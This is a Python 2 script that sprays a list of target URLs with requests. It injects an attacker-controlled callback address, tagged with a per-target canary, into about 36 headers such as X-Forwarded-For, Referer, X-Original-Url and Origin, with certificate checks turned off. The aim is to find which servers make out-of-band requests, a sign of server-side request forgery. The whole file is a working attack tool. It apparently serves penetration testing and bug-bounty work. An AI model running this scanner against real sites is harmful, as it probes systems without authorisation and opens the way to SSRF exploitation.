import urllib2
import ssl
import sys
import re
import time
from socket import error as SocketError
from datetime import datetime


def runwithheader(pingaddress, header):
  for line in infile:
   time.sleep(.25)
   opener = urllib2.build_opener(urllib2.HTTPSHandler(context=ctx))
   URL = line.replace("\n","").replace("https://","").replace("http://","")
   canary = header + URL
   newpingaddress = pingaddress.replace("REPLACE",canary)
   opener.addheaders = [(header, newpingaddress), ('Cache-Control', 'no-transform'), ('User-agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15')]
   print(opener.addheaders)
   print(datetime.now())
   try:
    response = opener.open(line.strip(), timeout=10)
   except ssl.SSLError as e:
    print 'URL       :',line.strip()
    print 'SSL Error'
    print '-----------'
    pass
   except SocketError as e:
    print 'URL       :',line.strip()
    #print('The server couldn\'t fulfill the request.')
    print 'Error code: ', e.errno
    print 'Title     :', ""
    #print 'HEADERS   :'
    print '-----------'
   except urllib2.HTTPError as e:
    data = e.read()
    #e.read() response.read()
    match = re.search('<title>(.*?)</title>', data)
    title = match.group(1) if match else 'No title'
    print 'URL       :',line.strip()
    #print('The server couldn\'t fulfill the request.')
    print 'Error code: ', e.code
    print 'Title     :', title
    #print 'HEADERS   :'
    print '-----------'
    print data[0:150]
    print ''
   except urllib2.URLError as e:
    data = "" 
    #e.read()
    #e.read()
    match = re.search('<title>(.*?)</title>', data)
    title = match.group(1) if match else 'No title'
    print 'URL       :',line.strip()
    #print('We failed to reach a server.')
    print 'Reason    : ', e.reason
    print 'Title     :', title
    #print 'HEADERS   :'
    print '-----------'
    print data[0:150]
    print ''
   except:
    pass
   else:
    #print 'RESPONSE:', response
    data = response.read()
    match = re.search('<title>(.*?)</title>', data)
    title = match.group(1) if match else 'No title'
    print 'URL       :', response.geturl()
    print 'URL Orig  :', line.strip()
    print 'Response  :', response.getcode()
    print 'Title     :', title
    headers = response.info()
    #print 'DATE      :', headers['date']
    #print 'HEADERS   :'
    #print '-----------'
    #print headers

    #data = response.read()
    print 'LENGTH    :', len(data)
    #print 'DATA      :'
    print '-----------'
    #print data
    print ''
    print ''

infile = open(sys.argv[1], 'r')
pingaddress = sys.argv[2]
#outfile = open('myfile.txt', 'w') 

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

injectable_headers = [
    "Proxy-Host","Request-Uri","X-Forwarded","X-Forwarded-By","X-Forwarded-For","Link",
    "X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Server","X-Forwarder-For",
    "X-Forward-For","Base-Url","Http-Url","Proxy-Url","Redirect","Real-Ip","Referer","True-Client-IP",
    "X-WAP-Profile","Uri","Url","X-Host","X-Http-Destinationurl","X-Http-Host-Override",
    "X-Original-Remote-Addr","X-Original-Url","X-Proxy-Url","X-Rewrite-Url","X-Real-Ip","X-Remote-Addr",
    "X-Custom-IP-Authorization","Client-IP","Connection","Contact","From","Origin"]
for header in injectable_headers:
  runwithheader(pingaddress, header)
  infile.close()
  infile = open(sys.argv[1], 'r')
infile.close()
#outfile.close()
